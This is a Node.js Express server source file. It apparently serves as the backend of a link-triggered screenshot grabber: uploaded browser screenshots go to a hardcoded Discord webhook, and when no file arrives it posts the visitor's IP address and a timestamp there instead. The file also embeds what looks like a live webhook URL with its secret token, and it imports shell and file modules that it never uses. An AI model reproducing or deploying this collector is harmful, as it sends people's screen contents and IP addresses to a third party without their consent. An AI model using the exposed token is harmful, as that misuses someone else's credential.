const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const fetch = require('node-fetch');

const app = express();
const PORT = 3000;

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413280766208512111/O9G7lYVuX7oieCK9XisBl1EEf74lRxYjL83RRLnlKtnyRAgly42jKEmKElAINhHTPCdj';

app.use(express.static('.'));

app.post('/screenshot', async (req, res) => {
    try {
        console.log('Screenshot request received');
        
        if (req.headers['content-type'] && req.headers['content-type'].includes('multipart/form-data')) {
            const multer = require('multer');
            const upload = multer({ storage: multer.memoryStorage() });
            
            upload.single('screenshot')(req, res, async (err) => {
                if (err) {
                    console.error('Upload error:', err);
                    return res.status(500).json({ error: 'Upload failed' });
                }
                
                if (!req.file) {
                    return res.status(400).json({ error: 'No file uploaded' });
                }
                
                try {
                    const form = new FormData();
                    form.append('content', `📸 Browser screenshot captured!`);
                    form.append('file', req.file.buffer, {
                        filename: `screenshot-${Date.now()}.png`,
                        contentType: 'image/png'
                    });
                    
                    const webhookResponse = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: form
                    });
                    
                    if (webhookResponse.ok) {
                        console.log('Browser screenshot sent to Discord successfully');
                        res.json({ success: true, message: 'Screenshot sent to Discord!' });
                    } else {
                        console.error('Failed to send browser screenshot to Discord:', webhookResponse.status);
                        res.status(500).json({ error: 'Failed to send screenshot to Discord' });
                    }
                } catch (webhookError) {
                    console.error('Webhook error:', webhookError);
                    res.status(500).json({ error: 'Failed to send screenshot to Discord' });
                }
            });
        } else {
            try {
                const form = new FormData();
                form.append('content', `Screenshot request from: ${req.ip || 'Unknown'}\nTime: ${new Date().toISOString()}`);
                
                const webhookResponse = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: form
                });
                
                if (webhookResponse.ok) {
                    console.log('Screenshot request logged to Discord');
                    res.json({ success: true, message: 'Request logged!' });
                } else {
                    console.error('Failed to log request to Discord:', webhookResponse.status);
                    res.status(500).json({ error: 'Failed to log request' });
                }
            } catch (webhookError) {
                console.error('Webhook error:', webhookError);
                res.status(500).json({ error: 'Failed to log request' });
            }
        }
        
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
    console.log(`Screenshot app running at http://localhost:${PORT}`);
    console.log(`Click the link to take a screenshot!`);
});

process.on('SIGINT', () => {
    console.log('\nShutting down screenshot app...');
    process.exit(0);
});

